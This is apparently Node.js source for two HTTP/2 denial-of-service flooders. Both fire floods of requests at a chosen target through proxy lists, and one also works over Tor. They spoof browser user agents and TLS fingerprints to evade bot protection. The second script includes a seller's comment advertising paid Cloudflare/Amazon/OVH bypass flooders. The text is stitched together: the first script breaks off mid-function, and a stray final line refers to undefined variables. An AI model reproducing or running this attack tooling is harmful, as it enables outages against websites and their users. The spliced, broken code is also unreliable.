const fs = require('fs');
const cluster = require('cluster');
const crypto = require('crypto');
const { SocksClient } = require('socks');
const tls = require('tls');
const dns = require('dns');
const http2 = require('http2');
const { PassThrough } = require('stream');
const argv = require('minimist')(process.argv.slice(2));
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;

const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxytor = process.argv[6];

if (process.argv.length < 7) {
  console.log(`\n${'='.repeat(40)}`);
  console.log(`${'Usage:'.cyan} ${'TARGET TIME THREADS RATE PROXY'.yellow}`);
  console.log(`Example: ${'http://site.onion 60 15 80 proxy.txt'.green}`);
  console.log(`${'Note:'.blue} Make sure to use valid parameters and .onion address if applicable.`);
  console.log(`\n${'='.repeat(40)}\n`);
  process.exit(0);
}

let proxies;
try {
  proxies = fs.readFileSync(proxytor, 'utf-8').toString().split('\n').filter(proxy => {
    const parts = proxy.split(':');
    return parts.length === 2 && !isNaN(parts[1]);
  });
  if (proxies.length === 0) throw new Error('No valid proxies found.');
} catch (e) {
  console.log(`[Error] ${e.message}`);
  process.exit(0);
}

if (cluster.isPrimary) {
  console.log(`[+] Attack started on ${target} with ${threads} threads for ${time} seconds.`);
  for (let i = 0; i < threads; i++) cluster.fork();
  setTimeout(() => process.exit(0), time * 1000);
} else {
  setInterval(work());
}

const parsedURL = new URL(target);

function getFingerprint() {
  const currentDate = new Date().toISOString();
  const randomBytes = crypto.randomBytes(16);
  return crypto.createHash('sha256').update(currentDate + randomBytes.toString('hex')).digest('hex');
}

async function resolveDNS(hostname) {
  return new Promise((resolve, reject) => {
    dns.lookup(hostname, (err, address) => {
      if (err) return reject(err);
      resolve(address);
    });
  });
}

function generateUserAgent() {
  const browsers = [
    { name: 'Chrome', versions: ['91', '92', '93', '94', '95'] },
    { name: 'Firefox', versions: ['89', '90', '91', '92', '93'] },
    { name: 'Safari', versions: ['14', '15'] },
    { name: 'Edge', versions: ['91', '92', '93', '94'] },
    ];

  const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
  const randomVersion = randomBrowser.versions[Math.floor(Math.random() * randomBrowser.versions.length)];
  return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser.name}/${randomVersion}.0.0.0 Safari/537.36`;
}

async function work() {
  let ip;
  if (parsedURL.hostname.endsWith('.onion')) {
    ip = parsedURL.hostname;
  } else {
    try {
      ip = await resolveDNS(parsedURL.hostname);
      console.log(`[+] Resolved ${parsedURL.hostname} to ${ip}`);
    } catch (err) {
      console.log(`[Error] Could not resolve host: ${err.message}`);
      return;
    }
  }

  function flooder() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    const options = {
      proxy: { host: proxy[0], port: Number(proxy[1]), type: 4 },
      command: 'connect',
      destination: { host: ip, port: parsedURL.port || (parsedURL.protocol === 'https:' ? 443 : 80) }
    };

    SocksClient.createConnection(options, (err, info) => {
      if (err) return console.log(`[Error] Proxy connection failed: ${err.message}`);

      function makeRequest(socket) {
        const client = http2.connect(`${parsedURL.protocol}//${parsedURL.host}`, {
          createConnection: () => socket
        });
/*

Method created by @ThaiDuongScript


Currently now im selling some script

 20$ - tor - HTTP/2 Flooder with 100% HTTP-DDoS Bypass && High Request per Second
10$ - rst - HTTP/2 method bypass custom rule,bypass manage bot,bypass cloudflare,amazon,ovh,...

*/
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
var colors = require("colors");
const v8 = require("v8");
function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }


const accept_header = [
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

if (process.argv.length < 6) {
  console.log('node flooder target time rate thread proxy');
  process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function getRandomValue(array) {
    return array[Math.floor(Math.random() * array.length)];
}

          
          function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
const phienbantrinhduyet = Math.floor(Math.random() * 20) + 110; 
     const randomValue = Math.random()
     const userAgent = randomValue < 0.33 ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${phienbantrinhduyet}.0.0.0 Safari/537.36` : randomValue < 0.66 ? `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${phienbantrinhduyet}.0.0.0 Safari/537.36` : `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${phienbantrinhduyet}.0.0.0 Safari/537.36`;          
          

          const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
            



const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
       'rsa_pkcs1_sha512',
] 
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";"GREASE:X25519:x25519";

const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.SSL_OP_NO_TLSv1_3 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";"TLSv1_3_method","TLS_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);


const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
colors.enable();
if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
   console.clear()
 console.log('Target: '+process.argv[2]);
 console.log('Time: '+process.argv[3]);
 console.log('Rate: '+process.argv[4]);
 console.log('Thread(s): '+process.argv[5]);
 console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
       cluster.fork();

   }
} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 1) }}

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
  }
function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"
   
    
 
   let author = {
      "hostname" : parsedTarget.host,
       ":authority": parsedTarget.host,
       ":method": "GET",
       "Accept" : accept_header[Math.floor(Math.random() * accept_header.length)],
       ":path": parsedTarget.path,
       ":scheme": "https",
       "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site":"same-origin",
      "sec-fetch-user":"?1",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "accept-encoding": "gzip,deflate,br",
 "cache-control" : "max-age=0",
    "sec-ch-ua" : `"Not-A.Brand";v="99","Chromium";v="${phienbantrinhduyet}"`,
  "sec-ch-ua-mobile" : "?1",
   "upgrade-insecure-requests": "1",
 "Origin" : "https://www." + parsedTarget.host + "/" + generateRandomString(12),
   }

            const dynHeaders = {
            "user-agent" :userAgent,
                ...author,
            };
            
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true)

        const settings = {
           enablePush: false,
           initialWindowSize: 1073741823
       };

        const tlsOptions = {
           port: parsedPort,
           secure: true,
           ALPNProtocols: [
               "h2"
           ],
           ciphers: ciphers,
           sigalgs: sigalgs,
           requestCert: true,
           socket: connection,
           ecdhCurve: ecdhCurve,
           honorCipherOrder: false,
           host: parsedTarget.host,
           rejectUnauthorized: false,
           secureOptions: secureOptions,
           secureContext: secureContext,
           servername: parsedTarget.host,
           secureProtocol: secureProtocol
       };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 10000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: {
               headerTableSize: 65536,
               maxConcurrentStreams: 1000,
               initialWindowSize: 6291456,
               maxHeaderListSize: 262144,
               enablePush: false
           },
           maxSessionMemory: 3333,
           maxDeflateDynamicTableSize: 4294967295,
           createConnection: () => tlsConn,
           socket: connection,
       });

       client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           maxFrameSize : 40000,
           enablePush: false
       });

       client.setMaxListeners(0);
       client.settings(settings);

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   
                   const request = client.request(dynHeaders)
                   
                                   

                   .on("response", response => {
                       request.close();
                       request.destroy();
                       return
                   });
                   request.end();
               }
           }, 550); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
const client = http2.connect(parsed.href, clientOptions, function() {
 });
